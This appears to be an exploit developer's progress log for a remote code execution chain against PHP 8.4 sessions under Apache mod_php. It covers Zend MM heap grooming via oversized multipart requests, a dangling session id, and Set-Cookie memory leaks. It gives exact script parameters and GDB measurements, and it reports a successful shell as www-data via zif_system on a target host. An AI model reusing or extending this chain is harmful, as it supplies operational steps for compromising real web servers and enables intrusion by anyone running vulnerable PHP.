# Leak Path Without display_errors: Research Progress

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (amd64)
Constraints: Attack requests use HTTP only; the final target is not instrumented. All GDB measurements here were made on the **calibration lab 172.16.1.112**, without touching 172.16.0.103.

Status: **The mechanism has been verified; only the final page-level memory exhaustion remains.** The chain no longer needs `display_errors=On` or a `max_input_vars` warning to set `headers_sent`.

---

## 1. Why the Original Path Needed display_errors

Stage 1/2 A needs:

~~~text
PS(send_cookie)=1
+
php_session_reset_id() fails (so send_cookie is not cleared)
+
A OOMs before RINIT, leaving PS(id) dangling
~~~

The original setup emitted a `max_input_vars` warning to set `SG(headers_sent)` to 1, causing `php_session_send_cookie()` to return FAILURE. `php_error_docref` is controlled by `display_errors`. When it is Off, the warning goes to the log without response output, `SG(headers_sent)` stays 0, `reset_id` succeeds, and `send_cookie` is cleared.

---

## 2. Tested Alternatives That Do Not Work

### 2.1 `Expect: 100-continue`

Apache did return this before PHP processing:

~~~text
HTTP/1.1 100 Continue
~~~

But PHP's `SG(headers_sent)` remained 0. After A:

~~~text
ps_globals.id          = 0x7ffff5e6e000
ps_globals.send_cookie = false
~~~

This confirms that 100-continue is handled at the Apache layer and does not set the PHP SAPI's `headers_sent`. Discard this path.

### 2.2 Make `sapi_header_op` Fail with an Invalid Header

The `Set-Cookie` value in `php_session_send_cookie()` comes from `php_url_encode(PS(id))`, which percent-encodes CR/LF/NUL as `%XX`. `session_name` comes from INI and is not attacker-controlled. When headers have not been sent, `sapi_header_op` fails only if a header contains CR/LF/NUL, which cannot be constructed here. Discard this path.

### 2.3 Change `display_errors` / `error_log` Remotely

`display_errors` and `error_log` are PHP_INI_ALL/PERDIR settings, but the attacker has no target-side code execution or `.htaccess` write access. `PHP_VALUE` works only through CGI/FastCGI configuration channels and cannot be injected through request headers with mod_php. Discard this path.

---

## 3. Viable Mechanism: OOM Inside `php_session_reset_id()`

Order of operations in `ext/session/session.c`:

~~~c
/* php_session_initialize() */
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
    ...
    PS(id) = create_sid();
    if (PS(use_cookies)) {
        PS(send_cookie) = 1;          /* <-- set first */
    }
}
if (php_session_reset_id() == FAILURE) { ... }
~~~

`php_session_reset_id()`:

~~~c
if (PS(use_cookies) && PS(send_cookie)) {
    cookies_sent = php_session_send_cookie();
    if (cookies_sent == FAILURE) return FAILURE;
    PS(send_cookie) = 0;              /* <-- clear only after successful send */
}
~~~

`php_session_send_cookie()` allocates:

- The Set-Cookie header in `smart_str` (about 64B).
- `php_url_encode(PS(id), 32)` → `zend_string_safe_alloc(3, 32)`: `24 + 96 + 1 = 121` → **128B bin**.

If these allocations fail in `zend_mm`, `zend_bailout` jumps directly to request shutdown with `PS(send_cookie)` still 1. A's large field continues to cause OOM before RINIT, leaving `PS(id)` dangling. No warning output is needed.

---

## 4. Lab Verification (172.16.1.112, display_errors=Off)

### 4.1 A Shape

`tools/send_a_oomreset.py` / `send_a_bin128.py` / `send_a_longfile.py`:

~~~text
PHPSESSID = "\x00"
PHP_SESSION_UPLOAD_PROGRESS = "pwn"
997 registered padding fields (value size is configurable)
file field (configurable filename length)
~~~

There is no 12 MB large field; padding and file headers trigger OOM before RINIT.

### 4.2 Key Measurements

Read Zend MM with GDB at the entry to `php_session_reset_id`:

~~~text
V=3000, 997 fields, N128=128:
RESET send=1 size=5878488 real=6291456 limit=8388608 rem=2097152 slot11=(nil) mainfree=0 chunks=3
RESET send=0 ...
~~~

- `size` is about 5.9M, while `real_size` is only three chunks = 6M. `rem = limit - real_size = 2MB`, so one more chunk can still be acquired.
- The 128B bin (`free_slot[11]`) is empty.
- The cookie's 128B page allocation still succeeds from a free page in an existing chunk or a new chunk.

At V=3200, `php_sapi_filter → zend_string_init(3200)` for a padding field OOMs **before FILE_START**:

~~~text
MM_SAFE_ERROR limit=8388608 size=8256744
#4 zend_string_alloc(len=3200)
#6 php_sapi_filter
#7 rfc1867_post_handler
~~~

This shows Zend MM fails when it needs a new 4KB page but cannot acquire another 2MB chunk:

~~~text
ZEND_MM_CHUNK_SIZE (2MB) > limit - real_size  -> reject the new chunk
~~~

### 4.3 Remaining Step at That Point

Use a long filename (the file part's filename, not interned and counted toward memory) to push `real_size` to the limit:

~~~text
F=688128:
RESET send=1 size=7954856 real=8388608 limit=8388608 rem=0 slot11=(nil)
CHUNK 0 free_pages=0
CHUNK 1 free_pages=0
CHUNK 2 free_pages=68
CHUNK 3 free_pages=4
~~~

- `rem=0`: no additional chunk can be acquired.
- The 128B bin is empty, so the cookie needs a new page.
- But the four chunks still have **72 free pages**, so the cookie's 128B page is allocated successfully from chunk 2/3 and `send_cookie` is cleared. Only a later allocation in A OOMs (id dangling, but `send_cookie=false`).

A 4KB sweep of F:

~~~text
F=688128  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,4   (72)
F=692224  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,1   (69)
F=696320  NO_RESET (OOM before FILE_START)
~~~

A filename by itself can reduce the free-page count only to 69. Another 4KB causes OOM while allocating the filename/header, so those 69 pages remain available to the cookie.

**Required state** at the first `php_session_reset_id`:

~~~text
real_size == limit
rem == 0
free_slot[11] == NULL
all chunks have free_pages == 0
~~~

Then the cookie's 128B page allocation fails and `send_cookie` remains 1.

---

## 4.4 Achieved: A Primitive with display_errors=Off

Final usable A on the calibration lab with `display_errors=Off`:

~~~text
python3 send_a_idmain.py 129 3000 570 3040 20 1
  args: N128=129, V=3000, NH=570, HL=3040, NS=20, N64E=1
~~~

After A:

~~~text
ps_globals.id          = 0x7ffff5e6e080   (main chunk, page 0x6e)
ps_globals.send_cookie = true
~~~

Key points:

1. **997 padding fields** push the heap to `real_size = limit = 8M`.
2. **NH=570 unknown headers with 3040-byte values** reduce the chunk free-page count to 0.
3. **N128=129 values of 103 bytes** empty the 128B bin used by the cookie's `url_encode` allocation.
4. **NS=20 headers of 15 bytes** empty the 40B bin used by the cookie's first `"Set-Cookie: "` smart_str allocation.
5. On entry to `php_session_send_cookie`: `slot4 != NULL, slot11 == NULL, sum(free_pages) == 0`. The 40B allocation uses an existing slot; the 128B allocation has no page and OOMs.
6. `send_cookie` stays 1, `PS(id)` is dangling, and the child remains alive.
7. **One ordinary field with a 39-byte value (N64E=1) at the start of padding** makes the bin-64 bin allocate a page in the main chunk early. The id later reuses this page at `chunk+0x6e080` instead of landing in a non-main chunk that shutdown would release.

Measured after A:

~~~text
NS=12/20/27:
$1 = 0x7ffff3dff000  $2 = true     # early version (id in chunk 3)
N128=129, N64E=1:
$1 = 0x7ffff5e6e080  $2 = true     # id in main chunk
~~~

This achieves **`send_cookie=1 + dangling PS(id)` without depending on display_errors**.

---

## 5.1 Current Calibration of the B Leak

B must reclaim `0x7ffff5e6e080` (64B-aligned, page 0x6e, offset 0x80) as a fake zend_string. Current findings:

- During B cleanup, A's id page `0x6e000` is rebinned as **16B** (`map[0x6e]=0x80000001`); the id block becomes part of a 16B free-list.
- Measured B forge raw addresses from the `php_sapi_filter` val_len branch:
  - 32B forge: `0x7ffff5e011a0` (page 0x1).
  - The B 64B bin also did not claim page 0x6e.
- Zend MM assigns bin pages from the lowest-address free pages first. A gets id page 0x6e only when its heap is nearly full; B's 32B/64B bins take lower pages first (0x1, 0x2, ...), while temporary 16B/8B strings claim 0x6e earlier.
- Fixed a multipart construction bug in B: the header/body separator must be `\r\n\r\n`. Without it, the forge/PHPSESSID/progress values all have length 0.

Next steps, in priority order:

1. **Redirect page allocation:** Put a large field (or a set of medium fields) before B's forge part to consume low-address free pages, making the next 32B/64B bin page land at 0x6e. Then use the slot count to place four live 32B headers in slots 0–3 and the 32B forge raw buffer in slot 4 (the id).
2. **Move A's id page:** Change N64E (early 39B field count) or padding order so the id page lands on a low page B's 32B/64B bin actually uses. The id must remain in the main chunk, or shutdown releases that chunk.
3. **16B geometry:** The id page is already rebinned as 16B. To use that bin, two 16B slots must remain live and controlled during cleanup; currently raw/parameter buffers are freed and overwritten by free-list next pointers, so this is harder.

### 5.2 64B Geometry: One Page Away

After fixing the multipart separator, measured B 64B forge raw locations:

~~~text
b_forge64_first (two 39B headers + 63B forge; forge part first):
  FORGE raw = 0x7ffff5e6f000   (page 0x6f, slot 0)

b_forge64_pre (two ordinary 39B fields + 63B forge):
  FORGE raw = 0x7ffff5e6f100   (page 0x6f, slot 4)
~~~

A's id:

~~~text
0x7ffff5e6e080   (page 0x6e, slot 2)
~~~

The new 64B bin page consistently lands at **0x6f**, while temporary 16B/32B strings claim A's id page 0x6e first (during B cleanup, `map[0x6e]` was `0x80000001`). They differ by one page.

Tried moving A's id to 0x6f by increasing early 39B fields to N64E=64 (N128=192), filling all 64 slots in the 0x6e bin-64 page. NH retuning results:

~~~text
NH=632  RESET send=1 free=31 SEND0=1  POST id=0 send=false
NH=660  RESET send=1 free=3  SEND0=0  POST id=0 send=false
NH=670  NO_RESET
~~~

Reset is reached and the cookie may fail, but A's child is replaced after shutdown, losing `PS(id)/send_cookie`. To align the 64B slot:

1. Keep A's child alive around N64E=64 (change NH/NS/N128, or move the early 64B fields) so the id lands at 0x6f000/0x6f100 and `send_cookie=true` after A; or
2. Make B's 64B bin claim page 0x6e before the 16B/32B bins (force a 64B page allocation during request startup/early parts before the smaller bins claim it).

### 5.3 Latest Alignment Experiments (Still No Hit)

- **B's page stays at 0x6f:** Regardless of forge part order, pre-fields, HTTP `X-A/X-B` 39B headers, 39-character Host, or 17-byte boundary, 64B forge raw lands at `0x7ffff5e6f000` (forge first) or `0x7ffff5e6f100` (two pre-fields). Server-var/bin page competition at request startup lets the 16B/32B bins claim 0x6e first, and the 64B bin gets 0x6f.
- **Move the id on A's side:**
  - `N64H=62` 39B headers, NH=565: child survives, but id stays at `0x6e080` (headers did not consume the head slot).
  - `N64H=63..70`: id still at `0x6e080`.
  - `N64H=80`: id moves to `0x7ffff5dfef40` (wrong page), `send=false`.
  - Trailing K 39B live fields + one 63B raw field (LIFO makes id take the raw slot): for K=1..16 and NH=570+K, the child does not retain the id.
  - `N64E=64` fills the 64 slots in 0x6e; with NH=632..660, reset is reached and the cookie may fail, but A's child is replaced at shutdown, so post-A id=0.

Conclusion: A's primitive is stable; B's 64B forge is one page away. Continue tuning heap/page order so A's id lands at 0x6f000/0x6f100 while its child survives, or make B's 64B bin claim 0x6e first.

Once B's forge raw lands at `0x7ffff5e6e080`, `Set-Cookie` will contain an out-of-bounds read with `len=0x1000`, and the B decoding/chunk-base recovery will be the same as in the original display_errors path.

---

## 5. Strategy for Consuming the Remaining Free Pages

The remaining 72 pages (288KB) must be consumed **after the filename and before reset**, without a transient peak that exceeds available pages. Confirmed constraints:

- Field names are interned (`php_register_variable_quick` → `zend_string_init_interned`) and **do not count toward memory_limit**; longer field names do not help.
- A single oversized padding field (>3072) has a raw buffer and value string alive together in the filter, with about a 2× peak, and OOMs early.
- A long filename also exists in two copies (header line + filename), with about a 2× peak. At F=688K, 72 pages remain; at F≥720K, OOM occurs early.

Potential directions, by priority:

1. **Allocate several medium-sized values in sequence so the temporary buffer is freed between allocations.**
   - For example, use multiple long header values in a file part (filename, Content-Type) or several medium value fields.
   - Each allocation has about a 2× peak, but the previous raw/line buffer is freed before the next one.
   - Live memory can consume the 72 pages gradually without a peak exceeding the remaining pages.
2. **Consume remaining pages after the filename inside FILE_START.**
   - The filename is already the last large live string before reset.
   - If another long string can be allocated after it but still before FILE_START completes (for example Content-Type), it could consume more pages without increasing the peak.
3. **Fill the remaining pages with live values/page allocations from several small bins.**
   - The remaining 69 pages are page-level free pages in chunks 2/3; the large filename allocation does not use them (`free_pages` is unchanged).
   - Before reset, force multiple **bin slow paths** to allocate new pages and consume these 69 pages one at a time. For example, distribute the 997 padding value sizes across bins so each bin's current page fills and the next field triggers a new page.
   - Each new bin page consumes one `free_page`. The goal is `sum(free_pages)==0` at the first reset, so the cookie's 128B page allocation fails.
   - The 2× peak for an individual field still limits total live data; use medium-sized fields and let raw buffers be freed between fields.

After each parameter change, use `tools/chunks2.gdb` on the calibration lab to inspect `real/rem/slot11/free_pages` for each chunk at the first reset. A successful A should leave:

~~~text
ps_globals.id          != 0
ps_globals.send_cookie == true
~~~

Then B can still use the existing 80B/64B forge. Recalibrate the id block address (B's K/offset) for the new A shape; the leak no longer depends on display_errors.

---

## 6. Files

| File | Purpose |
|---|---|
| `tools/send_a_oomreset.py` | Basic OOM-reset A (N fields with V-byte values + file) |
| `tools/send_a_bin128.py` | Fill the 128B bin with 103B values (same bin as cookie e_id) |
| `tools/send_a_longfile.py` | Use a long non-interned filename to consume chunk free pages |
| `tools/mem2.gdb` | Print size/real/limit/rem/slot11 at reset entry |
| `tools/chunks2.gdb` | Print free_pages for all chunks |
| `tools/oomsite2.gdb` | Capture `zend_mm_safe_error` call site and backtrace |

---

## 7. Conclusion

- The original dependence on `display_errors` came from warning output setting `headers_sent`.
- `100-continue`, invalid headers, and remotely changing INI are not viable.
- **OOM inside `php_session_reset_id()`** is a viable alternative. On the calibration lab with `display_errors=Off`, the heap has been pushed to `real=limit, rem=0` with the 128B bin empty; only the final 72 chunk free pages remain to be consumed.
- **A is complete:** `send_a_idmain.py 129 3000 570 3040 20 1` leaves `send_cookie=1` and a dangling PS(id) in the main chunk (`chunk+0x6e080`) with display_errors Off.
- Remaining work is calibration of B's fake zend_string landing point (page routing/slot alignment), not a new primitive.

---

## 8. RCE Verification and Final Status of the display_errors Dependency (2026-10-21 20:16)

### 8.1 RCE Proof on the Reference Lab

The original chain ran successfully on `172.16.0.103` (ASLR enabled, one-worker prefork) using `tools/pure_aslr_run.sh`:

~~~text
W1=925534  chunk=0x7f2517800000  attempt=1
W2=925632  libphp=0x7f2516000000 attempt=1
W3=925730  HTDATA=0x7f251786e0d8 ZIF=0x7f251643a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

That is end-to-end RCE using two `Set-Cookie` leaks (chunk, libphp) and `zif_system` (`libphp+0x43a870`); all attack requests use HTTP.

### 8.2 display_errors Dependency in This Chain

A in `send_a_leak2/leak3` relies on a `max_input_vars` warning setting `SG(headers_sent)` to 1, so `php_session_reset_id()` fails before `php_session_send_cookie()` and leaves a dangling `PS(id)` with `send_cookie=1`. With `display_errors=0`, the warning is not output, `headers_sent` stays unset, A's reset sends the cookie normally and clears `send_cookie`, and B's END cleanup has no leak.

Measured by running the same driver against .103 with its current default `display_errors 0`:

~~~text
W1=924738 chunk=0x0 attempt=1
W1=924835 chunk=0x0 attempt=2
W1=924933 chunk=0x0 attempt=3
HEAP_LEAK_FAILED
~~~

To verify the RCE itself, `display_errors` in `/etc/apache2/conf-enabled/php8426.conf` on .103 was temporarily changed from 0 to 1, then restored to 0 after the run and Apache was restarted with `apache2ctl -k restart`. Currently `curl 127.0.0.1:8088/index.php` returns `OK`.

### 8.3 Current display_errors=Off Status

A (no warning or output) is complete on the calibration lab:

~~~text
A: tools/send_a_plain.py 129 3000 570 3040 20 1
RESET send=1 real=8388608 limit=8388608 rem=0 slot11=NULL
B cleanup: PS(id)=0x7ffff5e6e080 send=1, page 0x6e
~~~

B has not hit the target yet. A's id is a 32-character random session id (64B zend_string, slot 2 in the 64B page 0x6e). B's 64B forge raw buffer consistently lands on page 0x6f (`0x7ffff5e6f000`/`…f100`), while temporary 16B/32B strings claim page 0x6e during B's request startup (at cleanup, `map[0x6e]=0x80000001`). The 32B variant (forge raw on page 0x1, slot 13) and the 8-character PHPSESSID variant (id becomes 32B, but lands on page 0x…1d7 in chunk 1) were also tried; neither aligned with A's id page/slot.

The remaining issue is still alignment:

- Put A's 64B id page in the page B's 64B bin uses (0x6e instead of 0x6f), or
- Make B's 64B bin claim page 0x6e before the 16B bin (39B HTTP header padding has not moved the raw page), or
- Use an 8-character id to put the id in B's 32B page 0x1 slot 13 (requires calibrating A's 32B page/slot).

Until then, the pure-HTTP chain with `display_errors=0` has not reached RCE. The verified RCE used the reference configuration with `display_errors=On`.

---

## 9. Latest Location of Pure-HTTP B (2026-10-21 20:30)

### 9.1 Call Site That Claims Page 0x6e

On .112, `tools/slowbins.gdb` (break on `zend_mm_alloc_small_slow`) caught B's 16B slow path:

~~~text
SLOW bin=1 map6e=0x0
#1 _estrdup (s="Y-000")
#2 multipart_buffer_headers ... main/rfc1867.c:413
~~~

That is, the first unknown multipart header **name** in B (for example, `Y-000`, 6B) triggers the 16B bin's slow path and claims A's page 0x6e before the 64B/24B bin can use it.

### 9.2 Attempt to Forge a 24B Slot

A's id pointer is `0x…6e080`; on a 24B page, `ZSTR_LEN` would be at `0x…6e090` (slot 6). Tried writing `len=0x1000` into slot 6 with the unknown header value of the final part (23B → 24B smart_string, still live during END cleanup):

- `tools/b_24hdr.py`, `b_24cookie.py`, `b_24hold.py` (including 200 15B dummy headers to try to hold the 24B page).
- At cleanup, page 0x6e was still `map=0x80000001` (16B); `0x6e090 = 0x…6e080` (16B free-list next); B returned an empty response (`php_url_encode` read a huge len → OOM/bailout).

Cause: multipart headers are C strings. The little-endian first byte of `len=0x1000` is `0x00`, so `smart_string_appends`/`strlen` truncates it. A 24B allocation requires a value length of 17–23; the first 8 bytes cannot both avoid NUL and encode the needed small integer. A raw body-value buffer can carry binary data, but it is freed immediately after registration and the free-list next pointer overwrites its first qword. The 24B forge path is effectively blocked.

### 9.3 A ID-Page Scan

~~~text
N64E=1   id=0x…6e080   (main chunk)
N64E=65  id=0x…83080   (64B page 0x83)
N64E=66  id=0x…83100
N64E=67  id=0x…83180
N64E=64/N128=192/NH=580  id=0x…5dab000 (chunk 1)
N64E=64/N128=129/NH=570  id=0x…3dfe000 (chunk 1)
~~~

B's 64B page is always 0x6f (`b_forge64_first` raw=0x…6f000). A's 64B page is 0x6e, 0x83, or in chunk 1; they do not reliably overlap.

### 9.4 Conclusion

- The 1-day RCE itself was demonstrated end-to-end under the `display_errors=On` reference configuration (section 8).
- A's `display_errors=Off` primitive works, but B's leak is still blocked by Zend MM page allocation: A's id page (64B) does not overlap B's available 64B/32B/24B pages, and a 24B C-string forge is limited by NUL.
- Next either find an A shape that puts the id exactly on B's first 64B page 0x6f, or switch leak primitives (for example, let B claim and keep alive A's 24B/64B page).

---

## 10. Two More Attempts: 8B Free List and Long Header Names (2026-10-21 20:50)

### 10.1 8B Free-List Idea

If B's 8B bin claims A's page 0x6e, use an 8B slot to forge `ZSTR_LEN`. A 7-byte body value's raw buffer is freed in the 8B bin; if the free list is empty, the slot's first qword becomes 0. Reuse the same slot for a one-character header name `A` (`estrdup` allocates 2B in the 8B bin), which writes `A\0`. The old qword then makes `ZSTR_LEN = 0x41`. Read 65 bytes from `0x6e098`, enough to include a neighboring free-list heap pointer.

`tools/b_8tail.py` builds this shape (16 short-name headers + 7-byte body + six `A: B` progress-part headers), but at cleanup:

~~~text
CLEANUP id=0x7ffff5e6e080 send=1
page=0x6e map=0x80000001       # still 16B
0x6e090: 0x7ffff5e6e080        # 16B free-list next
~~~

The 16B bin (for `form-data`/server variables, etc.) still claims 0x6e before the 8B bin.

### 10.2 A with Longer Header Names

Tried changing A's 570 header names from 10 characters to 16 (`_estrdup` 17B → 24B bin). The goal was to avoid filling A's 16B bin with 570 names, so B's first 16B allocation would hit the slow path and claim 0x6e:

~~~text
A: send_a_longhdr.py 129 3000 570 3040 20 1
Result: reset breakpoint not hit (A OOMs during header parsing; id was not created)
B: b_forge64_first raw=0x7ffff5e6f000 (still page 0x6f)
~~~

The extra ~7KB from longer names made A OOM before reset. NH needs retuning to preserve reset OOM and the 16B bin state, but B's raw buffer page remains 0x6f.

### 10.3 Summary

Measured page-0x6e allocation priority in B:

~~~text
16B (_estrdup/form-data)  >  24B  >  8B  >  64B
~~~

A's id page (64B) is always claimed first by a smaller bin. Changing A's header length makes OOM happen earlier. Warm-up history, the 8B free-list, 24B header value, and long header-name approaches have all been tried; none has placed B's forge over A's id `len` field.
